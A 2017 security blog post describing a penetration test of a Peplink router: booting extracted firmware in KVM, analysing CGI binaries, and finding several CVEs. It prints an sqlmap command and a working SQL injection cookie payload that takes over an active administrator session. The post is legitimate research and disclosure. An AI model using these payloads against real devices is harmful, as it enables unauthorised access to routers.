# Basic embedded security testing using KVM

https://x41-dsec.de/lab/blog/24smiley/

During a recent penetration test for a customer, Claus and I noticed a Peplink router web interface exposed to the Internet. While I noticed an XSS (CVE-2017-8839) Claus spotted strange behavior with an overly long ```bauth``` cookie. This peaked our interest of course.

The next logical step was to fingerprint the device, to get to know more about the specific model and firmware version. Due to a configuration error, it was possible to download some of the CGI files in their binary form. Since these turned out to be 64-bit ELF executables, we got even more curious. In order to identify the correct make and model, I downloaded all firmware files available from the peplink website, and extracted them using binwalk. Everything with ARM files was directly discarded and after some poking, ```fw-b305hw2_-380hw6_-580hw2_-710hw3_-1350hw2_-2500-7.0.0-build1904.bin``` seemed to be our canidate for further inspection, which was the most current version for this line of models.

Binwalk extracted a Linux EXT2 filesystem, which we were able to mount via loopback for further inspection. Inside were some bootdata.bin files. While I fiddled with binwalk to get the data inside them out for further inspection, Claus came up with a way to simply boot those files in a KVM container: ```kvm -m size=128 --kernel bootdata1.bin --append "root=/dev/ram0 ramdisk_size=131072 console=tty0 fw=1 init=/bin/sh" --initrd bootdata2.bin```.

This made the first analysis much easier, but we wanted more. Since it was not really a nice working environment inside the container and networking did not want to work, I extracted the files on the filesystem and poked them until I was able to run them inside a chroot()-Environment on my machine. This allowed me to easily copy tools and helpers into the peplink environment for further investigations.

The first thing to inspect was of course the crash. Since the CGI specification specifies the passing of data and variables via environment variables, I was quickly able to reproduce the issue and generate a coredump. The signal 7 hinted, that the cause for the crash was a write into a non writable region. An inspection in IDA showed, that the write seems to be into a guard page, due to the variable being assigned at the end of a page. No interesting data seemed to be overwritten in between the variable and the guard page. Close but no cigar :(

While Claus continued looking at other systems, I continued investigating the chrooted firmware. Using ltrace and fiddling with ltrace.conf, I was able to see which variables the different CGI scripts parsed easily, since they used the ```libcgi.so``` helper library. Going trough the scripts, another XSS (CVE-2017-8838) was quickly spotted as well as an information leak (CVE-2017-8840), which provided the serial number of the device and internal IP address.

Still not being able to get a valid session, I glanced around to see how the login process worked. The login process parsed the files ```/etc/waipass``` and ```/etc/roapass``` and visiting the related parts in IDA, it was revealed, that not much processing happened. After entering a plain text password into the ```waipass ```file, I was able to login and generate a valid session in my chrooted environment.

This allowed me to inspect further code paths, which were previously not accessible. Another issue, quickly spotted, was the missing CSRF protection CVE-2017-8836, which allowed to change everything, if a logged in administrator is successfully attacked. Unfortunately, this kind of attack was out of scope for our test, so still no luck.

With the last day of the penetration test already running and the feeling that there should be a bug, giving us more access, I was motivated even tough we already popped some other machines. Another issue which allowed a DoS via file deletion as a logged in administrator CVE-2017-8841, by abusing the firmware update process did not help us to gain further access. So back to the login process and session handling. The session variable, which is passed around via the bauth cookie variable is stored in an sqlite database. So why not try a simple SQL injection. We did try this before, and saw strange behavior, but got sidetracked by the crash due to an overly long cookie value. The usual tool of choice was to use sqlmap against the live system and let it do all the magic work:
```
$ ./sqlmap.py -u "https://ip/cgi-bin/MANGA/admin.cgi" --cookie="bauth=csOWLxU4B[...]xH16426647" -p"bauth" --level 5 --risk 3 --dbms sqlite --technique=BEUSQ --flush-session -t trace.log --prefix "'" --suffix "--" -a

sqlmap identified the following injection point(s) with a total of 258 HTTP(s) requests:
---
Parameter: bauth (Cookie)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: bauth=-5663' OR 9790=9790--
---
[13:51:56] [INFO] testing SQLite
[13:51:56] [INFO] confirming SQLite
[13:51:56] [INFO] actively fingerprinting SQLite
[13:51:56] [INFO] the back-end DBMS is SQLite
[13:51:56] [INFO] fetching banner
[13:51:56] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:51:56] [INFO] retrieved: 3.8.11.1
back-end DBMS: SQLite
banner:    '3.8.11.1'
```
Unfortunately, I was not able to extract much data, since the brute force of the table structure always failed. After a certain point, the query got too long and caused the crash. So I checked the structure in my chrooted environment in order to help sqlmap to extract data, but somehow it did not work. So back to the drawing board to see how to exploit this manually. The first thing I was interested in, was to see which queries arrived at the database layer exactly. Since ```libsqlite3.so``` was used by the CGI script, I grabbed a copy of the source code and patched it to simply log the queries received into a file. This allowed me to construct a query to simply select an already running administrator session to be used for my login
```
bauth=-12' or id IN (select s.id from sessions as s left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1') or '1'='2'
```
This SQL injection CVE-2017-8835 finally allowed us access to the device as long as an administrator session is running. With the last day of the penetration test already over, I wrote everything up for the customer and finished the report. The customer took the web interface offline the next day in order to no longer expose this attack surface to the internet, while I started contacting peplink in order to get this fixed for everybody. The updated firmware was released on 05.06.2017 by peplink.

Author: Eric Sesterhenn
Date: 2017-06-05 00:00:00 +0200

tags: Hardware Pentest Links